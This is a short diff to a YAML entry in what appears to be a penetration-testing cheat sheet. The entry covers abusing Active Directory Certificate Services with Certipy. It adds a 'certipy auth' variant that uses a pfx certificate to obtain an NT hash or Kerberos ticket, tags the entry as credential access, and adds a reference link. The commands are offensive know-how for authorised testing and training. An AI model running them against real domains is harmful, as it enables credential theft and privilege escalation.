@@ -56,6 +56,8 @@ variants:
     command: |
       # authenticate with a pfx to recover the NT hash / get a TGT
       certipy auth -dc-ip $DCIP -pfx administrator.pfx
+      # when the pfx carries more than one identity, name the one you want
+      certipy auth -dc-ip $DCIP -pfx user.pfx -username $USER -domain $DOMAIN
       # if that fails, drop into an LDAP shell instead
       certipy auth -dc-ip $DCIP -pfx administrator.pfx -ldap-shell
 description: Enumerate and abuse AD CS with Certipy (ESC1 / ESC7 / ESC9 / shadow).
@@ -63,7 +65,8 @@ os: [Linux]
 category: [oscp, cli]
 have: [hash, ticket, cert]
 service: [ADCS, Kerberos]
-phase: [Enumeration, PrivEsc]
+phase: [Enumeration, PrivEsc, CredAccess]
 references:
+  - https://www.kali.org/tools/certipy-ad/
   - https://github.com/ly4k/Certipy
 ---
